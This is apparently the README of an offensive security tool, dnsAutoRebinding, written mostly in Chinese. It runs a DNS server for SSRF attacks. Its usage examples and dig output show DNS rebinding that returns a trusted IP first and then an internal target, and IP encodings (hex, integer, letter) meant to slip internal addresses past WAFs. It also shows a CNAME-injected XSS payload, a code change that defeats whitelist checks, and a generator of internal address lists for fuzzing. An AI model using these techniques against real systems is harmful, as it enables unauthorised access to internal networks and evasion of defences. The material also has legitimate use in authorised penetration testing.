# dnsAutoRebinding

> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ssrf、ssrf内网地址fuzz、dns二次rebinding、支持ipv4/ipv6、支持ip地址转换码、dns记录污染(文末一个0day为例)。脑图在脑子里，懒得画了。

support Record Type and Encoding：

```
MX = ipv4/ipv6/hex
A = ipv4/en/int/hex
AAAA = ipv6/int/hex
CNAME = ipv4/ipv6/hex
```

配置监听服务器example.com：

| record type | record | record value |
| --- | --- | --- |
| A | ns | server ip |
| NS | test | ns.example.com |

> sudo pip install ipaddr

修改lib/config.conf：
maindomain = test.example.com.
注意根地址.要加

```
Usage: sudo python main.py {Options}

Options:
  -h, --help            show this help message and exit
  -t 300, --TTL=300     ttl value , 0 By Default
  -y A/AAAA/CNAME/MX, --Type=A/AAAA/CNAME/MX
                        Record Type , A By Default
  -e int/hex/en, --Encoding=int/hex/en
                        Record Encoding , None By Default
  -r, --Rebinding       The Second Time Query Return Target Ip
  -p "<script>alert(/xss/)</script>", --payload="<script>alert(/xss/)</script>"
                        Specified Record , Support CNAME/MX

```

-y选项指定以什么记录类型返回：
`-y A/AAAA/CNAME/MX, --Type=A/AAAA/CNAME/MX Record Type , A By Default`

-t选项指定TTL值：
`-t 300, --TTL=300     ttl value , 0 By Default`

直接A记录返回ipv4地址：
`sudo ./main.py`

```
➜  ~ dig 192.168.1.1.test.example.com

; <<>> DiG 9.8.3-P1 <<>> 192.168.1.1.test.example.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 50359
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0

;; QUESTION SECTION:
;192.168.1.1.test.example.com.	IN	A

;; ANSWER SECTION:
192.168.1.1.test.example.com. 0	IN	A	192.168.1.1

;; AUTHORITY SECTION:
test.example.com.		227	IN	NS	ns.example.com.
```

server:
`[21:54:16] client ip:44486 => A => 192.168.1.1.test.example.com.`

hex编码：
`sudo ./main.py -e hex`

```
➜  ~ dig 31302e302e302e31.test.example.com

; <<>> DiG 9.8.3-P1 <<>> 31302e302e302e31.test.example.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 1585
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0

;; QUESTION SECTION:
;31302e302e302e31.test.example.com.	IN	A

;; ANSWER SECTION:
31302e302e302e31.test.example.com. 0 IN	A	10.0.0.1

;; AUTHORITY SECTION:
test.example.com.		600	IN	NS	ns.example.com.
```

server:
`[22:00:42] client ip:30150 => A => 31302e302e302e31.test.example.com.`

int编码：
`sudo ./main.py -e int`

```
➜  ~ dig 3232235777.test.example.com

; <<>> DiG 9.8.3-P1 <<>> 3232235777.test.example.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 18066
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0

;; QUESTION SECTION:
;3232235777.test.example.com.	IN	A

;; ANSWER SECTION:
3232235777.test.example.com. 0	IN	A	192.168.1.1

;; AUTHORITY SECTION:
test.example.com.		456	IN	NS	ns.example.com.
```

server:
`[22:03:00] client ip:5240 => A => 3232235777.test.example.com.`

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为waf会识别出内网地址才用的上本项目，那么waf大可识别进制转换这种，所以要自己写个地址转换方法：

num to en:

```
./lib/common.py 192.168.1.1

1. Single IP Covert For En
2. Build IP List
[+] [1 By Default/2]
bjckbgikbkb
```

`sudo ./main.py -e en`

```
➜  ~ dig bjckbgikbkb.test.example.com

; <<>> DiG 9.8.3-P1 <<>> bjckbgikbkb.test.example.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5115
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0

;; QUESTION SECTION:
;bjckbgikbkb.test.example.com.	IN	A

;; ANSWER SECTION:
bjckbgikbkb.test.example.com. 0	IN	A	192.168.1.1

;; AUTHORITY SECTION:
test.example.com.		20	IN	NS	ns.example.com.
```

server:
`[22:10:22] client ip:8434 => A => bjckbgikbkb.test.example.com.`


dns二次rebinding:
```
sudo ./main.py -r
Input Safe Ip? [Address/Req By Default]8.8.8.8
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选择性输入目标信任的地址，比如在ssrf时防火墙在验证dns返回值是否存在于白名单。默认为发起请求的地址。(记得特殊情况需要指定记录类型)


第一次：

```
➜  ~ dig 192.168.1.1.test.example.com

; <<>> DiG 9.8.3-P1 <<>> 192.168.1.1.test.example.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 59544
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0

;; QUESTION SECTION:
;192.168.1.1.test.example.com.	IN	A

;; ANSWER SECTION:
192.168.1.1.test.example.com. 0	IN	A	8.8.8.8

;; AUTHORITY SECTION:
test.example.com.		461	IN	NS	ns.example.com.
```

第二次：

```
➜  ~ dig 192.168.1.1.test.example.com

; <<>> DiG 9.8.3-P1 <<>> 192.168.1.1.test.example.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 45312
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0

;; QUESTION SECTION:
;192.168.1.1.test.example.com.	IN	A

;; ANSWER SECTION:
192.168.1.1.test.example.com. 0	IN	A	192.168.1.1

;; AUTHORITY SECTION:
test.example.com.		501	IN	NS	ns.example.com.
```

dns记录污染：
`sudo ./main.py -p "<script>alert(/xss/)</script>" -y CNAME`

```
➜  ~ dig test.example.com

; <<>> DiG 9.8.3-P1 <<>> test.example.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5073
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0

;; QUESTION SECTION:
;test.example.com.			IN	A

;; ANSWER SECTION:
test.example.com.		0	IN	CNAME	<script>alert\(/xss/\)</script>test.example.com.
```

![](http://7xiw31.com1.z0.glb.clouddn.com/WX20170625-222928@2x.png)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个怎么玩取决于你的小脑袋瓜的脑回路了。如果防火墙还要验证是否为信任地址的话修改lib/common.py：

```
elif payload != 'None' and payload.find(mainDomain) == -1:
    record = payload + "信任地址."
```

ipListBuild:
批量生成网段地址，选择性编码，适合ssrf内网地址fuzz。

```
python lib/common.py 192.168.1.1

1. Single IP Covert For En
2. Build IP List
[+] [1 By Default/2]2
[+] Please Input Segment Length [24 By Default]
[+] Please Input Encoding ['ipv4' By Default]hex
[+] Please Input Server Root Address [test.example.com By Default]
[+] Stored in the 20170625223912_test_example_com_hex.txt
[root@VM_34_252_centos dnsAutoRebinding]# head -n 5 20170625223912_test_example_com_hex.txt
3139322e3136382e312e31.test.example.com
3139322e3136382e312e32.test.example.com
3139322e3136382e312e33.test.example.com
3139322e3136382e312e34.test.example.com
3139322e3136382e312e35.test.example.com
```

